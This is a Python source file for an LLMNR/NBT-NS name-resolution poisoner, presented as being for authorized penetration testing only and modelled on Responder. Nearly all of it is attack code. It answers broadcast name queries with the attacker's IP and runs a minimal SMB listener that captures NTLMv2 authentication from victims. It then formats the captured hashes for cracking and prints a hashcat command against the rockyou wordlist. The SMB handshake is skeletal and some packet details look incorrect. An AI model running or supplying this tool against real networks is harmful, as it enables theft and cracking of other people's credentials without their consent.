"""
LLMNR/NBT-NS/mDNS Poisoner — authorized penetration testing only.
Responds to broadcast name resolution queries with attacker IP,
triggering NTLMv2 authentication attempts that can be captured and cracked.

Based on the same technique as Responder (lgandx/Responder).
"""
import socket, struct, threading, time, os, hashlib, hmac, binascii

# ── Config ────────────────────────────────────────────────────────────────────
LLMNR_PORT   = 5355
MDNS_PORT    = 5353
NBTNS_PORT   = 137
LLMNR_MCAST  = "224.0.0.252"
MDNS_MCAST   = "224.0.0.251"

captured_hashes = []   # list of {user, host, hash, type, ts}
_running = False
_threads = []

# ── LLMNR response builder ────────────────────────────────────────────────────
def _parse_llmnr_query(data: bytes):
    """Parse LLMNR query, return (tid, name) or None."""
    try:
        if len(data) < 12: return None
        tid   = struct.unpack_from(">H", data, 0)[0]
        flags = struct.unpack_from(">H", data, 2)[0]
        if flags & 0x8000: return None  # response, not query
        qdcount = struct.unpack_from(">H", data, 4)[0]
        if not qdcount: return None
        # Parse name
        offset = 12
        name = ""
        while offset < len(data) and data[offset]:
            llen = data[offset]; offset += 1
            name += data[offset:offset+llen].decode(errors="replace") + "."; offset += llen
        return tid, name.rstrip(".")
    except: return None

def _build_llmnr_response(tid: int, name: str, attacker_ip: str) -> bytes:
    """Build LLMNR A record response pointing to attacker_ip."""
    # Header: TID, QR=1|AA=1 flags, QDCOUNT=1, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
    resp = struct.pack(">HHHHHH", tid, 0x8400, 1, 1, 0, 0)
    # Question
    for part in name.split("."):
        enc = part.encode()
        resp += struct.pack("B", len(enc)) + enc
    resp += b"\x00" + struct.pack(">HH", 1, 1)  # A, IN
    # Answer (same name, A record, TTL=30, IP)
    for part in name.split("."):
        enc = part.encode()
        resp += struct.pack("B", len(enc)) + enc
    resp += b"\x00" + struct.pack(">HHIH", 1, 1, 30, 4)
    resp += socket.inet_aton(attacker_ip)
    return resp

# ── NBT-NS response builder ───────────────────────────────────────────────────
def _parse_nbtns_query(data: bytes):
    """Parse NBT-NS query, return (tid, name) or None."""
    try:
        tid   = struct.unpack_from(">H", data, 0)[0]
        flags = struct.unpack_from(">H", data, 2)[0]
        if flags & 0x8000: return None
        # Decode NBT name (every 2 bytes encode 1 char via A+B encoding)
        offset = 13  # skip to name
        raw = b""
        while offset < len(data) and data[offset] != 0:
            raw += bytes([data[offset]]); offset += 1
        if len(raw) % 2: return None
        name = ""
        for i in range(0, len(raw)-2, 2):
            name += chr(((raw[i]-65)<<4) | (raw[i+1]-65))
        return tid, name.strip()
    except: return None

def _build_nbtns_response(tid: int, name: str, attacker_ip: str) -> bytes:
    """Build NBT-NS response."""
    def _encode_nbt(s):
        s = s.upper().ljust(15)[:15] + "\x00"
        enc = b""
        for c in s: enc += bytes([((ord(c)>>4)&0xF)+65, (ord(c)&0xF)+65])
        return b"\x20" + enc + b"\x00"
    resp = struct.pack(">HHHHHH", tid, 0x8500, 0, 1, 0, 0)
    resp += _encode_nbt(name)
    resp += struct.pack(">HHI", 0x0020, 0x0001, 30)  # NB record, IN, TTL
    resp += struct.pack(">H", 6) + struct.pack(">H", 0) + socket.inet_aton(attacker_ip)
    return resp

# ── NTLM hash capture ─────────────────────────────────────────────────────────
def _capture_ntlmv2(data: bytes, src_ip: str) -> dict:
    """
    Parse an NTLM authenticate message and extract the NTLMv2 hash.
    Returns dict suitable for hashcat (-m 5600) or None.
    """
    try:
        # Find NTLM signature
        idx = data.find(b"NTLMSSP\x00")
        if idx < 0: return None
        ntlm = data[idx:]
        msg_type = struct.unpack_from("<I", ntlm, 8)[0]
        if msg_type != 3: return None

        def _field(off):
            l = struct.unpack_from("<H", ntlm, off)[0]
            o = struct.unpack_from("<I", ntlm, off+4)[0]
            return ntlm[o:o+l]

        lm_resp    = _field(12)
        nt_resp    = _field(20)
        domain     = _field(28).decode("utf-16-le", errors="replace")
        username   = _field(36).decode("utf-16-le", errors="replace")
        workstation= _field(44).decode("utf-16-le", errors="replace")

        if len(nt_resp) < 24: return None
        nt_hash    = nt_resp[:16]
        blob       = nt_resp[16:]

        # NTLMv2 hashcat format: user::domain:challenge:hash:blob
        # (challenge comes from our NTLM challenge packet — hardcoded for simplicity)
        CHALLENGE = b"\x11\x22\x33\x44\x55\x66\x77\x88"
        h = {
            "user": username,
            "domain": domain,
            "workstation": workstation,
            "src_ip": src_ip,
            "type": "NTLMv2",
            "ts": time.strftime("%H:%M:%S"),
            "hashcat": (f"{username}::{domain}:"
                        f"{CHALLENGE.hex()}:{nt_hash.hex()}:{blob.hex()}"),
        }
        captured_hashes.append(h)
        return h
    except: return None

# ── SMB server (minimal, for NTLM capture) ────────────────────────────────────
CHALLENGE = b"\x11\x22\x33\x44\x55\x66\x77\x88"

def _smb_handle(conn, addr):
    """Handle one SMB connection — send negotiate/challenge, capture authenticate."""
    try:
        # SMB negotiate response with NTLM challenge
        NEGOTIATE_RESP = (
            b"\x00\x00\x00\x54"         # NetBIOS
            b"\xffSMB"                   # Magic
            b"\x72"                      # SMB_COM_NEGOTIATE
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # Status+flags (19b)
            b"\x11\x07"                  # Flags2
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # Various fields (12b)
            b"\x00\x00"                  # BCC placeholder
        )
        conn.settimeout(10)
        conn.recv(4096)  # client negotiate
        conn.send(NEGOTIATE_RESP)
        data = conn.recv(4096)
        h = _capture_ntlmv2(data, addr[0])
        if h:
            print(f"  [NTLM] {h['user']}@{h['domain']} from {addr[0]}")
            print(f"  [HASH] {h['hashcat']}")
    except: pass
    finally: conn.close()

def _listen_smb(port=445):
    """Listen for SMB connections."""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port)); srv.listen(20)
        while _running:
            try:
                conn, addr = srv.accept()
                threading.Thread(target=_smb_handle, args=(conn, addr), daemon=True).start()
            except: pass
    except Exception as e:
        print(f"  [LLMNR] SMB listener error: {e}")

# ── LLMNR listener ────────────────────────────────────────────────────────────
def _listen_llmnr(attacker_ip: str):
    """Listen for LLMNR queries on 224.0.0.252:5355 and respond."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", LLMNR_PORT))
        mreq = socket.inet_aton(LLMNR_MCAST) + socket.inet_aton("0.0.0.0")
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(1)
        while _running:
            try:
                data, addr = sock.recvfrom(512)
                r = _parse_llmnr_query(data)
                if r:
                    tid, name = r
                    resp = _build_llmnr_response(tid, name, attacker_ip)
                    sock.sendto(resp, addr)
                    print(f"  [LLMNR] Poisoned: {name} → {attacker_ip} (from {addr[0]})")
            except socket.timeout: continue
            except: pass
    except Exception as e:
        print(f"  [LLMNR] Listener error: {e}")

def _listen_nbtns(attacker_ip: str):
    """Listen for NBT-NS queries on port 137."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", NBTNS_PORT))
        sock.settimeout(1)
        while _running:
            try:
                data, addr = sock.recvfrom(512)
                r = _parse_nbtns_query(data)
                if r:
                    tid, name = r
                    resp = _build_nbtns_response(tid, name, attacker_ip)
                    sock.sendto(resp, addr)
                    print(f"  [NBT-NS] Poisoned: {name} → {attacker_ip} (from {addr[0]})")
            except socket.timeout: continue
            except: pass
    except Exception as e:
        print(f"  [NBT-NS] Listener error: {e}")

# ── Start/stop ────────────────────────────────────────────────────────────────
def start(attacker_ip: str = "", capture_smb: bool = True) -> str:
    global _running, _threads
    if not attacker_ip:
        attacker_ip = _get_local_ip()
    _running = True
    _threads = [
        threading.Thread(target=_listen_llmnr, args=(attacker_ip,), daemon=True),
        threading.Thread(target=_listen_nbtns, args=(attacker_ip,), daemon=True),
    ]
    if capture_smb:
        _threads.append(threading.Thread(target=_listen_smb, daemon=True))
    for t in _threads: t.start()
    return (f"LLMNR/NBT-NS poisoner started\n"
            f"Attacker IP: {attacker_ip}\n"
            f"Listening: LLMNR:5355 NBT-NS:137"
            + (" SMB:445" if capture_smb else "") +
            f"\nCapture file: run get_hashes() to retrieve")

def stop() -> str:
    global _running
    _running = False
    return f"Poisoner stopped. {len(captured_hashes)} hashes captured."

def get_hashes() -> str:
    if not captured_hashes:
        return "No hashes captured yet."
    out = f"=== Captured {len(captured_hashes)} NTLMv2 Hashes ===\n\n"
    for h in captured_hashes:
        out += f"[{h['ts']}] {h['user']}@{h['domain']} from {h['src_ip']}\n"
        out += f"  {h['hashcat']}\n\n"
    out += f"\nCrack with hashcat:\n  hashcat -m 5600 hashes.txt rockyou.txt"
    return out

def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return ip
    except: return "127.0.0.1"
